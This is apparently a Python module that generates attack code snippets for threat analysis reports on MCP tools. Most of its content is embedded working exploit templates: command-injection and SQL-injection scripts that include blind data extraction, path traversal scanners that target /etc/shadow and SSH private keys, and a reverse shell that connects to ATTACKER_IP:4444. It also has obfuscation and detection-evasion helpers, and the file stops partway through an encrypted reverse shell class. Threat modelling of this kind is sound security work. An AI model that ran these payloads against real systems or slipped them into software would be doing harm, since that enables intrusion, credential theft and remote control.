"""
Code Snippet Generator for Threat Analysis

This module generates realistic code snippets, payloads, and exploits
for threat analysis reports based on MCP tool capabilities.
"""

import re
import json
import base64
import hashlib
import logging
from typing import Dict, List, Optional, Any, Union, Tuple
from enum import Enum
from dataclasses import dataclass, field
from datetime import datetime

from .models import (
    ThreatAnalysis, ToolCapabilities, EnvironmentContext, 
    AttackVector, AbuseScenario, CapabilityCategory
)
from ..mcp_introspection.models import MCPTool, MCPServerInfo


logger = logging.getLogger(__name__)


class PayloadType(Enum):
    """Types of payloads that can be generated."""
    COMMAND_INJECTION = "command_injection"
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    PATH_TRAVERSAL = "path_traversal"
    REVERSE_SHELL = "reverse_shell"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    DATA_EXFILTRATION = "data_exfiltration"
    RECONNAISSANCE = "reconnaissance"
    PERSISTENCE = "persistence"
    BUFFER_OVERFLOW = "buffer_overflow"


class PayloadComplexity(Enum):
    """Complexity levels for payloads."""
    BASIC = "basic"
    INTERMEDIATE = "intermediate"
    ADVANCED = "advanced"
    EXPERT = "expert"


class ProgrammingLanguage(Enum):
    """Programming languages for code snippets."""
    PYTHON = "python"
    JAVASCRIPT = "javascript"
    BASH = "bash"
    POWERSHELL = "powershell"
    C = "c"
    CPP = "cpp"
    JAVA = "java"
    PHP = "php"
    RUBY = "ruby"
    GO = "go"
    SQL = "sql"


@dataclass
class CodeSnippet:
    """Represents a generated code snippet or payload."""
    
    title: str
    description: str
    language: ProgrammingLanguage
    payload_type: PayloadType
    complexity: PayloadComplexity
    code: str
    explanation: str
    prerequisites: List[str] = field(default_factory=list)
    references: List[str] = field(default_factory=list)
    risk_level: str = "medium"
    obfuscation_level: str = "none"  # none, light, heavy
    evasion_techniques: List[str] = field(default_factory=list)
    detection_signatures: List[str] = field(default_factory=list)
    mitigation_notes: List[str] = field(default_factory=list)
    timestamp: datetime = field(default_factory=datetime.now)
    
    def to_html(self) -> str:
        """Convert code snippet to HTML format for reports."""
        return f"""
        <div class="code-snippet {self.complexity.value} {self.risk_level}">
            <div class="snippet-header">
                <h4>{self.title}</h4>
                <div class="snippet-meta">
                    <span class="language">{self.language.value}</span>
                    <span class="payload-type">{self.payload_type.value}</span>
                    <span class="complexity">{self.complexity.value}</span>
                    <span class="risk-level risk-{self.risk_level}">{self.risk_level.upper()}</span>
                </div>
            </div>
            
            <div class="snippet-description">
                <p>{self.description}</p>
            </div>
            
            <div class="code-block">
                <div class="code-header">
                    <span class="code-label">Code:</span>
                    <button class="copy-btn" onclick="copyCode(this)">📋 Copy</button>
                </div>
                <pre><code class="language-{self.language.value}">{self.code}</code></pre>
            </div>
            
            <div class="snippet-explanation">
                <h5>How it works:</h5>
                <p>{self.explanation}</p>
            </div>
            
            {self._render_prerequisites()}
            {self._render_evasion_techniques()}
            {self._render_mitigation_notes()}
            
            <div class="warning-note">
                <strong>⚠️ WARNING:</strong> This code is for educational and testing purposes only. 
                Use only in authorized environments with proper consent.
            </div>
        </div>
        """
    
    def _render_prerequisites(self) -> str:
        """Render prerequisites section."""
        if not self.prerequisites:
            return ""
        
        items = "".join(f"<li>{prereq}</li>" for prereq in self.prerequisites)
        return f"""
        <div class="snippet-prerequisites">
            <h5>Prerequisites:</h5>
            <ul>{items}</ul>
        </div>
        """
    
    def _render_evasion_techniques(self) -> str:
        """Render evasion techniques section."""
        if not self.evasion_techniques:
            return ""
        
        items = "".join(f"<li>{technique}</li>" for technique in self.evasion_techniques)
        return f"""
        <div class="evasion-techniques">
            <h5>Evasion Techniques:</h5>
            <ul>{items}</ul>
        </div>
        """
    
    def _render_mitigation_notes(self) -> str:
        """Render mitigation notes section."""
        if not self.mitigation_notes:
            return ""
        
        items = "".join(f"<li>{note}</li>" for note in self.mitigation_notes)
        return f"""
        <div class="mitigation-notes">
            <h5>Detection & Mitigation:</h5>
            <ul>{items}</ul>
        </div>
        """


class CodeSnippetGenerator:
    """Generates realistic code snippets and payloads for threat analysis."""
    
    def __init__(self):
        """Initialize the code snippet generator."""
        self.logger = logging.getLogger(self.__class__.__name__)
        self.payload_templates: Dict[PayloadType, Dict[str, str]] = {}
        self.obfuscation_techniques: Dict[str, List[str]] = {}
        self.evasion_patterns: Dict[PayloadType, List[str]] = {}
        self._initialize_templates()
        self._initialize_evasion_patterns()
    
    def generate_payload_for_capability(self,
                                      capability: CapabilityCategory,
                                      tool_capabilities: ToolCapabilities,
                                      complexity: PayloadComplexity = PayloadComplexity.INTERMEDIATE) -> List[CodeSnippet]:
        """
        Generate payloads for a specific capability category.
        
        Args:
            capability: MCP capability category
            tool_capabilities: Tool capabilities information
            complexity: Desired payload complexity
            
        Returns:
            List[CodeSnippet]: Generated code snippets
        """
        snippets = []
        
        # Map capabilities to payload types
        payload_mappings = {
            CapabilityCategory.FILE_SYSTEM: [
                PayloadType.PATH_TRAVERSAL,
                PayloadType.DATA_EXFILTRATION,
                PayloadType.PRIVILEGE_ESCALATION
            ],
            CapabilityCategory.NETWORK_ACCESS: [
                PayloadType.RECONNAISSANCE,
                PayloadType.DATA_EXFILTRATION,
                PayloadType.REVERSE_SHELL
            ],
            CapabilityCategory.CODE_EXECUTION: [
                PayloadType.COMMAND_INJECTION,
                PayloadType.REVERSE_SHELL,
                PayloadType.PRIVILEGE_ESCALATION,
                PayloadType.PERSISTENCE
            ],
            CapabilityCategory.DATABASE_ACCESS: [
                PayloadType.SQL_INJECTION,
                PayloadType.DATA_EXFILTRATION
            ],
            CapabilityCategory.EXTERNAL_INTEGRATION: [
                PayloadType.DATA_EXFILTRATION,
                PayloadType.RECONNAISSANCE
            ]
        }
        
        payload_types = payload_mappings.get(capability, [PayloadType.RECONNAISSANCE])
        
        for payload_type in payload_types[:2]:  # Limit to 2 payloads per capability
            snippet = self._generate_payload_snippet(
                payload_type, 
                tool_capabilities.tool_name,
                complexity
            )
            if snippet:
                snippets.append(snippet)
        
        return snippets
    
    def generate_attack_chain_payload(self,
                                    attack_vectors: List[AttackVector],
                                    tool_name: str) -> CodeSnippet:
        """
        Generate a multi-stage attack chain payload.
        
        Args:
            attack_vectors: List of attack vectors to chain
            tool_name: Target tool name
            
        Returns:
            CodeSnippet: Multi-stage attack payload
        """
        # Build multi-stage payload
        stages = []
        
        for i, vector in enumerate(attack_vectors[:3], 1):  # Limit to 3 stages
            stage_code = self._generate_attack_stage(vector, i)
            stages.append(stage_code)
        
        combined_payload = "\n\n".join(stages)
        
        return CodeSnippet(
            title=f"Multi-Stage Attack Chain - {tool_name}",
            description=f"Comprehensive attack chain targeting {tool_name} with {len(attack_vectors)} stages",
            language=ProgrammingLanguage.PYTHON,
            payload_type=PayloadType.RECONNAISSANCE,  # Starting point
            complexity=PayloadComplexity.ADVANCED,
            code=combined_payload,
            explanation="This multi-stage attack demonstrates how attackers can chain multiple vulnerabilities to achieve comprehensive system compromise.",
            risk_level="critical",
            prerequisites=[
                "Network access to target system",
                "Basic understanding of target architecture", 
                "Python execution environment"
            ],
            evasion_techniques=[
                "Multi-stage execution to avoid detection",
                "Legitimate tool usage for stealth",
                "Time delays between stages"
            ],
            mitigation_notes=[
                "Monitor for unusual multi-stage activities",
                "Implement network segmentation",
                "Deploy behavioral analytics"
            ]
        )
    
    def generate_obfuscated_payload(self,
                                  base_payload: CodeSnippet,
                                  obfuscation_level: str = "light") -> CodeSnippet:
        """
        Generate an obfuscated version of a payload.
        
        Args:
            base_payload: Base payload to obfuscate
            obfuscation_level: Level of obfuscation (light, heavy)
            
        Returns:
            CodeSnippet: Obfuscated payload
        """
        obfuscated_code = self._apply_obfuscation(
            base_payload.code,
            base_payload.language,
            obfuscation_level
        )
        
        # Create new snippet with obfuscated code
        obfuscated_snippet = CodeSnippet(
            title=f"Obfuscated {base_payload.title}",
            description=f"Obfuscated version of {base_payload.title} to evade detection",
            language=base_payload.language,
            payload_type=base_payload.payload_type,
            complexity=PayloadComplexity.ADVANCED,  # Obfuscation increases complexity
            code=obfuscated_code,
            explanation=f"{base_payload.explanation} This version uses {obfuscation_level} obfuscation to evade signature-based detection.",
            risk_level=base_payload.risk_level,
            obfuscation_level=obfuscation_level,
            prerequisites=base_payload.prerequisites + [f"{obfuscation_level.title()} obfuscation knowledge"],
            evasion_techniques=[
                f"{obfuscation_level.title()} code obfuscation",
                "Anti-reverse engineering techniques",
                "Dynamic code generation"
            ],
            mitigation_notes=[
                "Use behavior-based detection systems",
                "Implement code analysis tools",
                "Monitor for obfuscation patterns"
            ]
        )
        
        return obfuscated_snippet
    
    def generate_evasion_variant(self,
                               base_payload: CodeSnippet,
                               evasion_technique: str) -> CodeSnippet:
        """
        Generate a payload variant with specific evasion techniques.
        
        Args:
            base_payload: Base payload
            evasion_technique: Evasion technique to apply
            
        Returns:
            CodeSnippet: Evasion variant
        """
        evasive_code = self._apply_evasion_technique(
            base_payload.code,
            base_payload.language,
            evasion_technique
        )
        
        evasion_snippet = CodeSnippet(
            title=f"Evasive {base_payload.title}",
            description=f"{base_payload.title} with {evasion_technique} evasion",
            language=base_payload.language,
            payload_type=base_payload.payload_type,
            complexity=PayloadComplexity.EXPERT,
            code=evasive_code,
            explanation=f"{base_payload.explanation} This variant employs {evasion_technique} to bypass security controls.",
            risk_level="high",
            evasion_techniques=[evasion_technique],
            prerequisites=base_payload.prerequisites + ["Advanced evasion knowledge"],
            mitigation_notes=[
                f"Deploy countermeasures for {evasion_technique}",
                "Use multi-layered detection",
                "Implement behavioral monitoring"
            ]
        )
        
        return evasion_snippet
    
    def _generate_payload_snippet(self,
                                payload_type: PayloadType,
                                tool_name: str,
                                complexity: PayloadComplexity) -> Optional[CodeSnippet]:
        """Generate a specific payload snippet."""
        
        generators = {
            PayloadType.COMMAND_INJECTION: self._generate_command_injection,
            PayloadType.SQL_INJECTION: self._generate_sql_injection,
            PayloadType.PATH_TRAVERSAL: self._generate_path_traversal,
            PayloadType.REVERSE_SHELL: self._generate_reverse_shell,
            PayloadType.DATA_EXFILTRATION: self._generate_data_exfiltration,
            PayloadType.RECONNAISSANCE: self._generate_reconnaissance,
            PayloadType.PRIVILEGE_ESCALATION: self._generate_privilege_escalation,
            PayloadType.PERSISTENCE: self._generate_persistence,
            PayloadType.XSS: self._generate_xss
        }
        
        generator = generators.get(payload_type)
        if not generator:
            return None
        
        return generator(tool_name, complexity)
    
    def _generate_command_injection(self,
                                  tool_name: str,
                                  complexity: PayloadComplexity) -> CodeSnippet:
        """Generate command injection payload."""
        
        if complexity == PayloadComplexity.BASIC:
            code = '''# Basic command injection
user_input = "test; cat /etc/passwd"
os.system(f"ping {user_input}")'''
            
        elif complexity == PayloadComplexity.INTERMEDIATE:
            code = '''#!/usr/bin/env python3
import subprocess
import os

def exploit_command_injection(target_param):
    """Exploit command injection vulnerability."""
    
    # Payloads to test
    payloads = [
        "; cat /etc/passwd",
        "| cat /etc/passwd", 
        "&& cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)"
    ]
    
    for payload in payloads:
        try:
            # Inject command into parameter
            malicious_input = f"normal_value{payload}"
            
            # Execute through vulnerable function
            result = subprocess.run(
                f"vulnerable_command {malicious_input}",
                shell=True, 
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if "/bin/bash" in result.stdout or "root:" in result.stdout:
                print(f"[!] Command injection successful with: {payload}")
                print(f"Output: {result.stdout[:200]}...")
                return True
                
        except Exception as e:
            print(f"[x] Payload failed: {payload} - {e}")
    
    return False

# Execute exploitation
if __name__ == "__main__":
    print("Testing command injection vulnerabilities...")
    exploit_command_injection("target_parameter")'''
        
        else:  # Advanced/Expert
            code = '''#!/usr/bin/env python3
import subprocess, os, sys, time, base64, urllib.parse
from typing import List, Dict, Any

class AdvancedCommandInjection:
    """Advanced command injection with evasion techniques."""
    
    def __init__(self):
        self.payloads = self._generate_payloads()
        self.encodings = ['url', 'base64', 'hex', 'unicode']
        
    def _generate_payloads(self) -> List[str]:
        """Generate context-aware payloads."""
        base_commands = [
            "cat /etc/passwd",
            "id && whoami", 
            "uname -a",
            "ps aux | grep root",
            "find / -name '*.key' 2>/dev/null"
        ]
        
        injection_patterns = [
            "; {cmd}",           # Command separator
            "| {cmd}",           # Pipe
            "&& {cmd}",          # Logical AND
            "|| {cmd}",          # Logical OR  
            "`{cmd}`",           # Command substitution
            "$({cmd})",          # Command substitution
            "{cmd} #",           # Comment out rest
            "\n{cmd}\n",         # Newline injection
            "' && {cmd} && '",   # Quote breaking
            '" && {cmd} && "'    # Double quote breaking
        ]
        
        payloads = []
        for cmd in base_commands:
            for pattern in injection_patterns:
                payloads.append(pattern.format(cmd=cmd))
        
        return payloads
    
    def encode_payload(self, payload: str, encoding: str) -> str:
        """Apply encoding to evade filters."""
        if encoding == 'url':
            return urllib.parse.quote(payload)
        elif encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'hex':
            return payload.encode().hex()
        elif encoding == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        return payload
    
    def test_blind_injection(self, injection_point: str) -> bool:
        """Test for blind command injection using time delays."""
        time_payloads = [
            "; sleep 5",
            "| sleep 5", 
            "&& sleep 5",
            "`sleep 5`",
            "$(sleep 5)"
        ]
        
        for payload in time_payloads:
            start_time = time.time()
            try:
                # Simulate injection attempt
                test_input = f"normal_input{payload}"
                # In real scenario, this would be sent to target
                subprocess.run(f"echo '{test_input}'", shell=True, timeout=10)
                
                elapsed = time.time() - start_time
                if elapsed >= 4.5:  # Allow for some variance
                    print(f"[!] Blind injection detected: {payload}")
                    return True
                    
            except subprocess.TimeoutExpired:
                print(f"[!] Timeout-based blind injection: {payload}")
                return True
            except Exception as e:
                continue
        
        return False
    
    def exploit_with_encoding(self, target: str, encoding: str = 'base64'):
        """Exploit with payload encoding."""
        dangerous_payload = "; cat /etc/passwd | base64"
        encoded_payload = self.encode_payload(dangerous_payload, encoding)
        
        print(f"[+] Original: {dangerous_payload}")
        print(f"[+] Encoded ({encoding}): {encoded_payload}")
        
        # In practice, this would be sent to the vulnerable application
        return encoded_payload

# Usage example
if __name__ == "__main__":
    injector = AdvancedCommandInjection()
    
    print("[+] Testing advanced command injection...")
    injector.test_blind_injection("vulnerable_param")
    
    print("[+] Testing encoded payloads...")
    for encoding in injector.encodings:
        encoded = injector.exploit_with_encoding("target", encoding)
        print(f"[+] {encoding.upper()}: {encoded[:50]}...")'''
        
        return CodeSnippet(
            title=f"Command Injection - {tool_name}",
            description=f"Command injection payload targeting {tool_name} parameter processing",
            language=ProgrammingLanguage.PYTHON,
            payload_type=PayloadType.COMMAND_INJECTION,
            complexity=complexity,
            code=code,
            explanation="Exploits command injection vulnerabilities by injecting OS commands into application parameters that are passed to shell execution functions.",
            risk_level="high" if complexity != PayloadComplexity.BASIC else "medium",
            prerequisites=[
                "Vulnerable parameter that gets passed to shell",
                "Understanding of target OS command syntax"
            ],
            evasion_techniques=[
                "Multiple injection syntax variations",
                "Payload encoding to bypass filters",
                "Time-based blind injection detection"
            ] if complexity == PayloadComplexity.ADVANCED else [],
            mitigation_notes=[
                "Input validation and sanitization",
                "Use parameterized commands instead of shell",
                "Implement command execution logging"
            ]
        )
    
    def _generate_sql_injection(self,
                              tool_name: str,
                              complexity: PayloadComplexity) -> CodeSnippet:
        """Generate SQL injection payload."""
        
        if complexity == PayloadComplexity.BASIC:
            code = '''-- Basic SQL injection payloads
' OR '1'='1
' OR 1=1--
' UNION SELECT * FROM users--
'; DROP TABLE users; --'''
            
        elif complexity == PayloadComplexity.INTERMEDIATE:
            code = '''#!/usr/bin/env python3
import requests
import time
from typing import List

def test_sql_injection(target_url: str, param: str):
    """Test for SQL injection vulnerabilities."""
    
    # Classic injection payloads
    payloads = [
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "' UNION SELECT user(), database(), version() --",
        "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a' --",
        "'; WAITFOR DELAY '00:00:05' --",  # Time-based (SQL Server)
        "' OR SLEEP(5) --",                # Time-based (MySQL)
        "' OR pg_sleep(5) --"              # Time-based (PostgreSQL)
    ]
    
    for payload in payloads:
        try:
            # Test payload
            data = {param: payload}
            start_time = time.time()
            
            response = requests.post(target_url, data=data, timeout=10)
            elapsed = time.time() - start_time
            
            # Check for various indicators
            if check_sql_injection_indicators(response, elapsed):
                print(f"[!] SQL injection found with: {payload}")
                return True
                
        except Exception as e:
            print(f"[x] Payload failed: {payload}")
    
    return False

def check_sql_injection_indicators(response, elapsed_time):
    """Check response for SQL injection indicators."""
    
    # Error-based indicators
    error_patterns = [
        "sql syntax", "mysql_fetch", "ora-", "microsoft ole db",
        "sqlite_", "postgresql", "warning: pg_"
    ]
    
    content = response.text.lower()
    
    # Check for database errors
    for pattern in error_patterns:
        if pattern in content:
            print(f"[!] Database error detected: {pattern}")
            return True
    
    # Check for time-based injection (5+ second delay)
    if elapsed_time >= 4.5:
        print(f"[!] Time-based injection detected: {elapsed_time:.2f}s")
        return True
    
    # Check for union-based injection patterns
    if any(word in content for word in ['user()', 'database()', 'version()']):
        print("[!] Union-based injection successful")
        return True
    
    return False

# Test execution
if __name__ == "__main__":
    target = "http://vulnerable-app.com/login.php"
    test_sql_injection(target, "username")'''
        
        else:  # Advanced/Expert
            code = '''#!/usr/bin/env python3  
import requests, time, string, threading
from urllib.parse import quote
import itertools

class AdvancedSQLInjection:
    """Advanced SQL injection with multiple techniques."""
    
    def __init__(self):
        self.session = requests.Session()
        self.detected_dbms = None
        
    def fingerprint_database(self, url: str, param: str) -> str:
        """Fingerprint the database management system."""
        
        fingerprint_payloads = {
            'mysql': "' AND @@version LIKE '%mysql%' --",
            'postgresql': "' AND version() LIKE '%PostgreSQL%' --", 
            'mssql': "' AND @@version LIKE '%Microsoft%' --",
            'oracle': "' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%' --",
            'sqlite': "' AND sqlite_version() IS NOT NULL --"
        }
        
        for dbms, payload in fingerprint_payloads.items():
            if self._test_boolean_injection(url, param, payload):
                print(f"[+] Database detected: {dbms.upper()}")
                self.detected_dbms = dbms
                return dbms
        
        return "unknown"
    
    def blind_boolean_injection(self, url: str, param: str, query: str) -> str:
        """Extract data using boolean-based blind injection."""
        
        extracted_data = ""
        position = 1
        
        while True:
            found_char = False
            
            # Try each character
            for char in string.printable:
                if char in ['%', '_', '\\']:  # Skip problematic chars
                    continue
                
                # Build injection payload
                if self.detected_dbms == 'mysql':
                    payload = f"' AND (SELECT SUBSTRING(({query}),{position},1))='{char}' --"
                elif self.detected_dbms == 'postgresql':
                    payload = f"' AND (SELECT SUBSTRING(({query}),{position},1))='{char}' --"
                else:  # Generic
                    payload = f"' AND (SELECT SUBSTR(({query}),{position},1))='{char}' --"
                
                if self._test_boolean_injection(url, param, payload):
                    extracted_data += char
                    print(f"[+] Found character at position {position}: {char}")
                    found_char = True
                    break
            
            if not found_char:
                break
                
            position += 1
            
            # Safety limit
            if position > 100:
                break
        
        return extracted_data
    
    def time_based_injection(self, url: str, param: str, query: str) -> str:
        """Extract data using time-based blind injection."""
        
        extracted_data = ""
        position = 1
        delay = 3  # seconds
        
        while True:
            found_char = False
            
            for char_code in range(32, 127):  # Printable ASCII
                char = chr(char_code)
                
                # Database-specific time delay payloads
                if self.detected_dbms == 'mysql':
                    payload = f"' AND IF((SELECT ASCII(SUBSTRING(({query}),{position},1)))={char_code},SLEEP({delay}),0) --"
                elif self.detected_dbms == 'postgresql':
                    payload = f"' AND CASE WHEN (SELECT ASCII(SUBSTRING(({query}),{position},1)))={char_code} THEN pg_sleep({delay}) END --"
                elif self.detected_dbms == 'mssql':
                    payload = f"' AND IF((SELECT ASCII(SUBSTRING(({query}),{position},1)))={char_code}) WAITFOR DELAY '00:00:0{delay}' --"
                else:
                    continue
                
                start_time = time.time()
                try:
                    self._send_payload(url, param, payload)
                    elapsed = time.time() - start_time
                    
                    if elapsed >= delay - 0.5:  # Allow some variance
                        extracted_data += char
                        print(f"[+] Time-based extraction - Position {position}: {char}")
                        found_char = True
                        break
                        
                except Exception:
                    continue
            
            if not found_char:
                break
                
            position += 1
            
            # Safety limit
            if position > 50:
                break
        
        return extracted_data
    
    def _test_boolean_injection(self, url: str, param: str, payload: str) -> bool:
        """Test boolean-based injection payload."""
        try:
            # Send malicious payload
            response_true = self._send_payload(url, param, payload)
            
            # Send payload that should return false
            false_payload = payload.replace("'1'='1'", "'1'='2'")
            response_false = self._send_payload(url, param, false_payload)
            
            # Compare responses
            return len(response_true.text) != len(response_false.text)
            
        except Exception:
            return False
    
    def _send_payload(self, url: str, param: str, payload: str):
        """Send payload to target."""
        data = {param: payload}
        return self.session.post(url, data=data, timeout=10)

# Usage example
if __name__ == "__main__":
    injector = AdvancedSQLInjection()
    
    target_url = "http://vulnerable-app.com/search.php"
    target_param = "query"
    
    print("[+] Starting advanced SQL injection test...")
    
    # Step 1: Fingerprint database
    dbms = injector.fingerprint_database(target_url, target_param)
    
    if dbms != "unknown":
        # Step 2: Extract database name
        db_query = "SELECT database()" if dbms == "mysql" else "SELECT current_database()"
        database_name = injector.blind_boolean_injection(target_url, target_param, db_query)
        print(f"[+] Database name: {database_name}")
        
        # Step 3: Extract user information
        user_query = "SELECT user()" if dbms == "mysql" else "SELECT current_user"
        current_user = injector.time_based_injection(target_url, target_param, user_query)
        print(f"[+] Current user: {current_user}")'''
        
        return CodeSnippet(
            title=f"SQL Injection - {tool_name}",
            description=f"SQL injection payloads targeting {tool_name} database queries",
            language=ProgrammingLanguage.PYTHON,
            payload_type=PayloadType.SQL_INJECTION,
            complexity=complexity,
            code=code,
            explanation="Exploits SQL injection vulnerabilities using various techniques including boolean-based blind injection, time-based injection, and database fingerprinting.",
            risk_level="critical" if complexity == PayloadComplexity.ADVANCED else "high",
            prerequisites=[
                "Target application with SQL database backend",
                "Injectable parameter in SQL query",
                "Understanding of SQL syntax"
            ],
            evasion_techniques=[
                "Multiple injection syntax variations",
                "Database-specific payload crafting",
                "Time-based blind extraction",
                "Boolean-based blind extraction"
            ] if complexity == PayloadComplexity.ADVANCED else [],
            mitigation_notes=[
                "Use parameterized queries/prepared statements",
                "Input validation and sanitization",
                "Principle of least privilege for database accounts",
                "Web Application Firewall (WAF) deployment"
            ]
        )
    
    def _generate_path_traversal(self,
                               tool_name: str,
                               complexity: PayloadComplexity) -> CodeSnippet:
        """Generate path traversal payload."""
        
        if complexity == PayloadComplexity.BASIC:
            code = '''# Basic path traversal payloads
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'''
            
        else:
            code = '''#!/usr/bin/env python3
import requests
import urllib.parse
from typing import List, Dict

def test_path_traversal(base_url: str, param: str):
    """Test for path traversal vulnerabilities."""
    
    # Common sensitive files across different systems
    target_files = {
        'linux': [
            '/etc/passwd',
            '/etc/shadow', 
            '/etc/hosts',
            '/proc/version',
            '/root/.ssh/id_rsa'
        ],
        'windows': [
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            'C:\\windows\\win.ini',
            'C:\\boot.ini',
            '%SYSTEMROOT%\\system32\\config\\sam'
        ]
    }
    
    # Various traversal techniques
    traversal_payloads = [
        # Basic traversal
        '../../../{file}',
        '....//....//....//..../{file}',
        
        # URL encoded
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}',
        '..%252f..%252f..%252f{file}',
        
        # Double URL encoded  
        '%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}',
        
        # UTF-8 encoded
        '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{file}',
        
        # Null byte injection (for older systems)
        '../../../{file}%00',
        '../../../{file}%00.jpg',
        
        # Absolute paths
        '{file}',
        
        # Mixed case (Windows)
        '..\\..\\..\\{file}',
        '..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\.\\{file}'
    ]
    
    for os_type, files in target_files.items():
        print(f"\\n[+] Testing {os_type.upper()} files...")
        
        for target_file in files:
            for payload_template in traversal_payloads:
                payload = payload_template.format(file=target_file)
                
                try:
                    # Test the payload
                    url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                    response = requests.get(url, timeout=10)
                    
                    # Check for successful traversal indicators
                    if check_traversal_success(response.text, target_file):
                        print(f"[!] Path traversal successful!")
                        print(f"    Payload: {payload}")
                        print(f"    File: {target_file}")
                        print(f"    Response preview: {response.text[:200]}...")
                        return True
                        
                except Exception as e:
                    continue
    
    return False

def check_traversal_success(content: str, target_file: str) -> bool:
    """Check if path traversal was successful."""
    
    # Linux file indicators
    linux_indicators = {
        '/etc/passwd': ['root:', '/bin/bash', '/bin/sh'],
        '/etc/shadow': ['root:', '$1$', '$6$'],
        '/etc/hosts': ['localhost', '127.0.0.1'],
        '/proc/version': ['Linux version', 'gcc'],
        '/root/.ssh/id_rsa': ['BEGIN RSA PRIVATE KEY', 'ssh-rsa']
    }
    
    # Windows file indicators
    windows_indicators = {
        'hosts': ['localhost', '127.0.0.1'],
        'win.ini': ['[fonts]', '[extensions]'],
        'boot.ini': ['boot loader', 'operating systems'],
        'sam': ['SAM', 'SECURITY']
    }
    
    content_lower = content.lower()
    
    # Check Linux indicators
    if target_file in linux_indicators:
        for indicator in linux_indicators[target_file]:
            if indicator.lower() in content_lower:
                return True
    
    # Check Windows indicators  
    for file_key, indicators in windows_indicators.items():
        if file_key in target_file.lower():
            for indicator in indicators:
                if indicator.lower() in content_lower:
                    return True
    
    # Generic checks
    if len(content) > 50 and any(char in content for char in [':', '/', '\\\\']):
        return True
    
    return False

# Advanced evasion techniques
def generate_advanced_payloads(base_file: str) -> List[str]:
    """Generate advanced evasion payloads."""
    
    payloads = []
    
    # Filter bypass techniques
    filter_bypasses = [
        '../' * 10 + base_file,                    # Deep traversal
        '../' * 5 + './' + '../' * 5 + base_file,  # Mixed with current dir
        base_file.replace('/', '/./'),              # Current directory injection
        base_file.replace('/', '//'),               # Double slash
        '../' * 3 + 'non_existent/../' + base_file, # Non-existent directory
    ]
    
    payloads.extend(filter_bypasses)
    
    # Encoding variations
    for payload in filter_bypasses[:3]:  # Limit encoding tests
        # URL encoding
        payloads.append(urllib.parse.quote(payload))
        
        # Double URL encoding
        payloads.append(urllib.parse.quote(urllib.parse.quote(payload)))
    
    return payloads

if __name__ == "__main__":
    print("[+] Starting path traversal test...")
    test_path_traversal("http://vulnerable-app.com/download", "file")
    
    print("\\n[+] Generating advanced payloads...")
    advanced = generate_advanced_payloads("/etc/passwd")
    for payload in advanced[:5]:  # Show first 5
        print(f"    {payload}")'''
        
        return CodeSnippet(
            title=f"Path Traversal - {tool_name}",
            description=f"Path traversal payloads for {tool_name} file access functions",
            language=ProgrammingLanguage.PYTHON,
            payload_type=PayloadType.PATH_TRAVERSAL,
            complexity=complexity,
            code=code,
            explanation="Exploits path traversal vulnerabilities to access files outside the intended directory structure using various encoding and bypass techniques.",
            risk_level="high",
            prerequisites=[
                "File parameter that accepts user input",
                "Insufficient path validation",
                "File system access functionality"
            ],
            evasion_techniques=[
                "Multiple encoding techniques (URL, UTF-8, double encoding)",
                "Various traversal patterns and depths",
                "Null byte injection for legacy systems",
                "Mixed directory separators"
            ] if complexity != PayloadComplexity.BASIC else [],
            mitigation_notes=[
                "Input validation and sanitization",
                "Use whitelisted allowed paths",
                "Implement proper access controls",
                "Canonicalize file paths before validation"
            ]
        )
    
    def _generate_reverse_shell(self,
                              tool_name: str,
                              complexity: PayloadComplexity) -> CodeSnippet:
        """Generate reverse shell payload."""
        
        if complexity == PayloadComplexity.BASIC:
            code = '''# Basic reverse shell
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])'''
            
        else:
            code = '''#!/usr/bin/env python3
import socket, subprocess, os, sys, time, threading
import base64, zlib, struct
from cryptography.fernet import Fernet

class AdvancedReverseShell:
    """Advanced reverse shell with encryption and evasion."""
    
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.key = None
        self.cipher = None
        self.socket = None
        
    def establish_connection(self) -> bool:
        """Establish connection with retry logic."""
        max_attempts = 5
        delay = 2
        
        for attempt in range(max_attempts):
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10)
                self.socket.connect((self.host, self.port))
                print(f"[+] Connected to {self.host}:{self.port}")
                return True
                
            except Exception as e:
                print(f"[x] Connection attempt {attempt + 1} failed: {e}")
                time.sleep(delay)
                delay *= 2  # Exponential backoff
        
        return False
    
    def setup_encryption(self):
        """Setup encrypted communication channel."""
        try:
            # Generate encryption key
            self.key = Fernet.generate_key()
            self.cipher = Fernet(self.key)
            
            # Send key to attacker (in real scenario, use key exchange)
            key_b64 = base64.b64encode(self.key).decode()
            self.send_data(f"KEY:{key_b64}")
            
            print("[+] Encryption setup complete")
            
        except Exception as e:
            print(f"[x] Encryption setup failed: {e}")
            self.cipher = None
    
    def send_data(self, data: str, encrypt: bool = False):
        """Send data to attacker."""
        try:
            if encrypt and self.cipher:
                data = self.cipher.encrypt(data.encode()).decode()
            
            # Compress data
            compressed = zlib.compress(data.encode())
            
            # Send length header + data
            length = struct.pack('>I', len(compressed))
            self.socket.sendall(length + compressed)
            
        except Exception as e:
            print(f"[x] Send failed: {e}")
    
    def receive_data(self, decrypt: bool = False) -> str:
        """Receive data from attacker."""
        try:
            # Receive length header
            length_data = self.socket.recv(4)
            if not length_data:
                return ""
            
            length = struct.unpack('>I', length_data)[0]
            
